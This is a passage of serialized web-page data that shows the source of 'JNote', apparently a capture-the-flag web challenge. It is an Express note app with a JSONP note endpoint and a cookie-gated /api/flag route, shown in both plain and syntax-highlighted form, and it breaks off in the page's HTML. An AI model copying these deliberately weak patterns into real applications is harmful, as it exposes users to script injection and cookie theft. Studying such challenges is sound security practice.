res.jsonp(notes.get(req.params.note));\n});\n\n/* retrieve the flag */\napp.get(\"/api/flag\", (req, res) =\u003e {\n    if (req.cookies.secret === process.env.SECRET) {\n        return res.json({\n            flag: process.env.FLAG\n        });\n    } else {\n        return res.json({\n            error: \"unauthorized\"\n        });\n    }\n});\n\n/* view a note */\napp.get(\"/note/:id\", (req, res) =\u003e {\n    return res.render(\"notes\", {\n        note: req.params.id\n    });\n});\n\n/* index */\napp.use(\"*path\", (req, res) =\u003e {\n    return res.render(\"index\");\n});\n\napp.listen(process.env.PORT || 1337, () =\u003e {\n    console.log(\"listening...\")\n});\n1c:T3773,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e express \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"express\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"path\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e crypto \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"crypto\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e cookieParser \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"cookie-parser\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e app \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eexpress\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003euse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eexpress\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejson\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"view engine\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"ejs\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"views\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e path\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejoin\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e__dirname\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"views\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003euse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eexpress\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estatic\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"public\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003euse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003ecookieParser\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token function-variable function\"\u003eget_id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e crypto\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003erandomBytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e16\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003etoString\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"hex\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e notes \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eMap\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* post a note */\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003epost\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/api/post\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        noteTitle\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        noteContent\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e req\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003enoteTitle \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token keyword\"\u003etypeof\u003c/span\u003e noteTitle \u003cspan class=\"token operator\"\u003e!==\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"string\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token operator\"\u003e!\u003c/span\u003enoteContent \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token keyword\"\u003etypeof\u003c/span\u003e noteContent \u003cspan class=\"token operator\"\u003e!==\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"string\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estatus\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e400\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejson\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token literal-property property\"\u003emessage\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"invalid note\"\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e id \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eget_id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    notes\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eid\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        noteTitle\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        noteContent\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejson\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        id\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* retrieve a note */\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/api/view/:note\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejsonp\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enotes\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ereq\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eparams\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003enote\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* retrieve the flag */\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/api/flag\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ereq\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ecookies\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esecret \u003cspan class=\"token operator\"\u003e===\u003c/span\u003e process\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eSECRET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejson\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token literal-property property\"\u003eflag\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e process\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eFLAG\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ejson\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token literal-property property\"\u003eerror\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"unauthorized\"\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* view a note */\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/note/:id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003erender\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"notes\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003enote\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e req\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eparams\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eid\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* index */\u003c/span\u003e\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003euse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"*path\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003erender\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"index\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elisten\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprocess\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eenv\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003ePORT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token number\"\u003e1337\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    console\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"listening...\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1d:T2223,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003elink\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003erel\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003estylesheet\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ehref\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e/style.css\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003ehttps://code.jquery.com/jquery-3.7.1.js\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n        \u003cspan class=\"token attr-name\"\u003eintegrity\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003esha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ecrossorigin\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003eanonymous\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eh1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003ePost a \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eJNote\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eh1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eform\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteForm\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eh2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eTitle\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eh2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003einput\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteTitle\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ename\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteTitle\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003etitle\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esize\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e50\u003cspan class=\"token 